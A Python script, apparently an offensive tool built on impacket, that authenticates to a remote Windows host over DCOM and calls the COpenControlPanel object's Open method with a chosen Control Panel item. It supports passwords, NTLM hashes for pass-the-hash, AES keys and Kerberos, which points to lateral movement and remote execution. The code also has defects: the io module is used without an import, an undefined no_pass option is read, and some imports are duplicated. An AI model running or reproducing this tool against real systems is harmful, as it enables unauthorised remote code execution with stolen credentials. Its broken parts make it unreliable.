import argparse
import logging
import sys

from impacket import version
from impacket.dcerpc.v5.dcom.oaut import string_to_bin, DISPPARAMS
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.dcomrt import DCOMCALL, IRemUnknown2
from impacket.dcerpc.v5.dtypes import LPWSTR, DWORD, NULL
from impacket.uuid import string_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket import hresult_errors

IID_IOpenControlPanel = string_to_bin('D11AD862-66DE-4DF4-BF6C-1F5621996AF1')
CLSID_COpenControlPanel = string_to_bin('06622D85-6856-4460-8DE1-A81921B41C4B')
CODEC = sys.stdout.encoding

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        if self.error_code in hresult_errors.ERROR_MESSAGES:
            error_msg_short = hresult_errors.ERROR_MESSAGES[self.error_code][0]
            error_msg_verbose = hresult_errors.ERROR_MESSAGES[self.error_code][1]
            return 'IOpenControlPanelOpen: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'IOpenControlPanelOpen Error: unknown error code: 0x%x' % (self.error_code)

def checkNullString(string):
    if string == NULL:
        return string

    if string[-1:] != '\x00':
        return string + '\x00'
    else:
        return string

class IOpenControlPanelOpen(DCOMCALL):
    opnum = 3
    structure = (
        ('pszName', LPWSTR),
        ('pszPage', DWORD),
        ('punkSite', DWORD),
    )

class IOpenControlPanel(IRemUnknown2):
    def __init__(self, interface):
        IRemUnknown2.__init__(self,interface)
        self._iid = IID_IOpenControlPanel

    def open(self, CplName, lcid = 0):
        request = IOpenControlPanelOpen()
        request['pszName'] = checkNullString(CplName)
        request['pszPage'] = 0
        request['punkSite'] = 0
        resp = self.request(request, iid = self._iid, uuid = self.get_iPid())

        return resp

class IOpenControlPanelOpenResponse:
    def __init__(self, answer, isNDR64):
        self.answer = io.BytesIO(answer)
        self.response = dict()
        self.parse_answer()

    def parse_answer(self):
        print(self.answer)
    def get_response(self):
        return self.response

class DCOMEXEC:
    def __init__(self, username='', password='', domain='', cpl=None, hashes=None, aesKey=None, doKerberos=False,
                 kdcHost=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__cpl = cpl
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            dispParams = DISPPARAMS(None, False)
            dispParams['rgvarg'] = NULL
            dispParams['rgdispidNamedArgs'] = NULL
            dispParams['cArgs'] = 0
            dispParams['cNamedArgs'] = 0
            iInterface = dcom.CoCreateInstanceEx(CLSID_COpenControlPanel, IID_IOpenControlPanel)
            icpannel = IOpenControlPanel(iInterface)
            resp = icpannel.open(self.__cpl)
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

if __name__ == '__main__':
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help = True, description = "Call Open function under IOpenControlPanel in COpenControlPanel COM object")
    parser.add_argument('-cpl', action='store', help='Contorl Panel Item Name')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')                                                              
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '                                                                       '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)
    try:
        if options.cpl is None:
            parser.print_help()
            sys.exit(1)
        if domain is None:
            domain = ''
        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True
        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")
        if options.aesKey is not None:
            options.k = True
        executer = DCOMEXEC(username, password, domain, options.cpl, options.hashes, options.aesKey,
                          options.k, options.dc_ip)
        executer.run(address)
    except (Exception, KeyboardInterrupt) as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

    sys.exit(0)